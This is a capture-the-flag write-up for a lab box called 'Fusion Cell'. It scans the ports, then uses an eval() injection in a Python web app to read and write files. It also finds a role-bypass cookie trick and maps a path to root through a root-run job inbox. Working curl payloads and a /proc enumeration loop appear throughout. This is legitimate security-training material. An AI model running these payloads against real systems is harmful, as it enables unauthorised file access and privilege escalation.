<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Fusion+Cell" alt="Typing SVG" /></a>

</div>

# Fusion Cell — PWN · JID-Pwn400 · Level 7 · 🟣 INSANE

- **Status:** 🟠 PARTIAL (2/4) — Flags 1 & 2 confirmed; Flags 3 & 4 blocked (ran out of competition time while about to read the root worker `/opt/app/tick.py`).
- **Points:** 700 / 3050 (150 + 550 earned)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (flags 1–2 plaintext, 3–4 likely `CTF{...}`)
- **Target:** `10.10.10.40` (lab, over VPN)
- **Prompt:** *boot2root — the "Joint fusion" Python app on `:7443`*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2222,7443` | ✅ |
| 2 | Low privilege user | `analyst` | ✅ |
| 3 | User flag | (not obtained — root-worker path mapped, not executed) | ❌ blocked |
| 4 | Root flag | (not obtained — `PLANNER` role → `/schedule` → root `tick.py` worker) | ❌ blocked |

---

## TL;DR

1. `:7443` is plain HTTP (not TLS); its `/query?unit=plan:<expr>` runs a real Python `eval()` with a weak sandbox (`__`/`import` blacklist, builtins limited to `open`/`str`) → arbitrary file read/write as `analyst`.
2. Reading `/opt/app/web.py` gives the low-priv user (`analyst`) and the privesc path: make the eval return `PLANNER` to get the role cookie, then `POST /schedule` writes a job into `/var/spool/fusion/inbox`, consumed by a root worker (`/opt/app/tick.py`).
3. Time ran out before reading `tick.py`, so Flags 3 and 4 were never captured.

8th sibling of the JID boot2root series (HarborWatch, NightWatchRoster, EscortConvoy, VisitorBadges, RadioShack, CoastalRadar, EmbassyGate, CivilNightShift…). Same skeleton: 2 open ports (SSH on a high port + Python `BaseHTTPServer` HTTP app), Flag1 = ports, Flag2 = the low-priv service user, Flag3 = user flag, Flag4 = root flag.

> All commands below were run manually by the operator over the VPN against the host.

---

## Recon — Flag 1: Open TCP ports

Connect VPN first (`sudo wg-quick up team71-player-a`, then `ping -c2 10.10.10.40`).

Fast full-range SYN scan, then confirm/fingerprint only the found ports:

```
sudo nmap -sS -p- --min-rate 3000 --max-retries 3 -Pn -n 10.10.10.40 -oN nmap-40-fast.txt
# 2222, 7443 open; 65533 closed(reset), 0 filtered — clean
sudo nmap -sS -sC -sV -p 2222,7443 --max-retries 6 -Pn -n 10.10.10.40 -oN nmap-40-svc.txt
```

Result:
- `2222/tcp` — OpenSSH 9.2p1 Debian (same host key as every sibling box → shared base image)
- `7443/tcp` — HTTP. nmap guessed `oracleas-https`, but it sent a TLS `SSLSessionReq` and got back a **plaintext** Python `http.server` `400 Bad request` page → **7443 is plain HTTP, not TLS**.

**Flag 1 = `2222,7443`** (open only, ascending, comma-separated, plaintext).

---

## Foothold — the HTTP app on 7443

Landing page (`GET /`) reveals the interface:

```
curl -sS http://10.10.10.40:7443/
# <h1>Joint fusion</h1><p>Query with unit=. Prefix plan: marks a planner expression.</p>
```

The real endpoint is **`/query`** (found by sweeping routes — all others returned the 1276-byte landing page; `/query` returned 2 bytes):

```
curl -sS -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:7*7"      # -> 49
curl -sS -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:7*'7'"    # -> 7777777
```

`7*'7'` → `7777777` (string repetition) proves it is a **real Python `eval()`**, not a calculator. The `plan:` prefix marks the expression; without it, `unit=` just returns `units: civil, military`.

### The sandbox (from source)

Read the app source with the eval itself (`open` is an allowed builtin):

```
curl -sS -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:open('/opt/app/web.py').read()"
```

Key logic in `/opt/app/web.py`:

```python
expr = unit[5:]
if "__" in expr or "import" in expr:          # blacklist
    self.send(400, "no")
    return
result = str(eval(expr, {"__builtins__": {"open": open, "str": str}}, {}))
...
if result == "PLANNER":
    ROLES["desk"] = "planner"
    self.send_response(200); self.send_header("Set-Cookie", "sid=desk"); ...
    self.wfile.write(b"PLANNER")
...
def do_POST(self):                            # POST /schedule
    if self.path != "/schedule": 404
    if "sid=desk" not in Cookie or ROLES["desk"] != "planner": 403 "planner only"
    job = self.form().get("job", [""])[0]
    open("/var/spool/fusion/inbox", "w").write("APPROVED\n" + job)
    self.send(200, "queued")

if __name__ == "__main__":
    serve(WH, user="analyst")                 # drops privs to analyst
```

So the eval is a **partial sandbox**:
- Blacklist: substrings `__` and `import` are rejected (kills `__class__` / `__subclasses__` / `__builtins__` dunder escapes and any `import`).
- `__builtins__` restricted to only `open` and `str`.

Net primitive: **arbitrary file READ and WRITE as `analyst`** (via the real `open`, including `open(path, 'w')`). No direct RCE from the eval.

`/opt/lib/drop.py` is just the theming library (`frame()` wraps HTML in a per-theme skin; its `THEMES` dict is the catalog of every sibling box's skin) plus `serve()`, which does `os.setuid(pwnam("analyst"))`. No worker here.

### Response oracle

- success → raw content (sent as `text/plain`, **not** theme-framed)
- exception → themed HTML with the error in `<div class="work">` (e.g. `[Errno 2] No such file`, `[Errno 13] Permission denied`) — so **absent vs. permission-denied is distinguishable**
- blacklist hit → themed HTML containing `no`

---

## Flag 2: Low privilege user

- `/opt/app/web.py` ends with `serve(WH, user="analyst")`.
- `/etc/passwd` has exactly one human/shell user: `analyst:x:1000:1000::/home/analyst:/bin/bash`.
- `/proc/self/status` of the web process → `Uid: 1000 1000 1000 1000`.

**Flag 2 = `analyst`.**

---

## Privesc chain discovered (path to Flag 4) — NOT yet executed

1. Make the eval return the literal string `PLANNER` to obtain the privileged role (the code only compares the string):
   ```
   curl -sS -i -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:'PLANNER'"
   # HTTP/1.0 200 OK
   # Set-Cookie: sid=desk
   # PLANNER
   ```
2. As the `planner` role, `POST /schedule` writes `APPROVED\n<job>` into **`/var/spool/fusion/inbox`** (written by `analyst`).
3. A **root worker consumes that inbox**. Process enumeration via `/proc/<pid>/cmdline` (the eval `open` read, since `os.listdir` is blocked) found:
   ```
   PID 1:  sshd: /usr/sbin/sshd -D [listener]      # container init
   PID 9:  python3 /opt/app/tick.py                # <-- the worker (started before privdrop → root)
   PID 10: python3 /opt/app/web.py                 # the analyst web app
   ```
   `/opt/app/tick.py` is almost certainly the root process that reads `/var/spool/fusion/inbox`, checks the `APPROVED` gate, and acts on `<job>`.

**We stopped exactly here** (time out) — the next read was `/opt/app/tick.py` to learn the job format/execution and craft the root payload.

### Enumeration dead-ends checked (so later attempts don't repeat them)
- `analyst` is **not** in `docker` / `lxd` / `sudo` / `disk` (`/etc/group`), so no group-based shortcut.
- No `/etc/crontab`, `/etc/cron.d/fusion`, `/etc/systemd/system/fusion*.service`, `/etc/rc.local`, `/entrypoint.sh`, `/etc/sudoers.d/*` — privesc is via the `tick.py` inbox worker, not cron/sudo.
- `/home/analyst/` appears empty: no `user.txt`, `flag.txt`, `local.txt`, `.ssh/id_rsa`, `.bash_history` (all `Errno 2`). The **user flag location is still unknown** — `os.listdir` is blocked, so it could not be enumerated without either the right path or a root shell.
- `/proc/self/environ` → `Errno 13` (file owned by root after setuid).

---

## Next steps to finish (resume here)

1. **Read the worker** and confirm it runs as root:
   ```
   curl -sS -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:open('/opt/app/tick.py').read()"
   curl -sS -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:open('/proc/9/status').read()"   # expect Uid: 0
   ```
2. From `tick.py`, derive the `job` that yields code execution as root (e.g. if it `os.system`/`subprocess`-runs the job line, inject a command; if it writes/executes a file, point it somewhere useful). Deliver it via:
   ```
   # 1) get the role cookie
   curl -sS -c cj -G "http://10.10.10.40:7443/query" --data-urlencode "unit=plan:'PLANNER'"
   # 2) queue the job (replace <JOB> per tick.py semantics)
   curl -sS -b cj -X POST "http://10.10.10.40:7443/schedule" --data-urlencode "job=<JOB>"
   ```
   Good first root job once semantics are known: copy both flags somewhere `analyst` can read, e.g.
   `cp /root/root.txt /var/spool/fusion/out; find / -name user.txt -o -name 'user*.txt' 2>/dev/null > /var/spool/fusion/find`,
   then read them back with the `open()` primitive.
3. **Flag 3 (user.txt):** once the root worker can run `find / -name user.txt 2>/dev/null` (or read analyst-owned dirs properly), locate and read it. The platform unlocks Flag 4 only after Flag 3 is submitted, but both file contents can be captured together via the root job and submitted in order.
4. **Flag 4 (root.txt):** read `/root/root.txt` via the root worker.

---

## Appendix — working payloads

```bash
BASE="http://10.10.10.40:7443/query"
# arbitrary file read as analyst:
curl -sS -G "$BASE" --data-urlencode "unit=plan:open('/etc/passwd').read()"
# list running processes (os.listdir is blocked; brute /proc/<pid>/cmdline):
for p in $(seq 1 250); do r=$(curl -sS -G "$BASE" --data-urlencode "unit=plan:open('/proc/$p/cmdline').read()" | tr '\0' ' '); case "$r" in *Errno*|*'<html'*|'') ;; *) echo "$p: $r";; esac; done
# blacklist: any expr containing "__" or "import" -> returns "no"
# builtins available in eval: only open, str
```
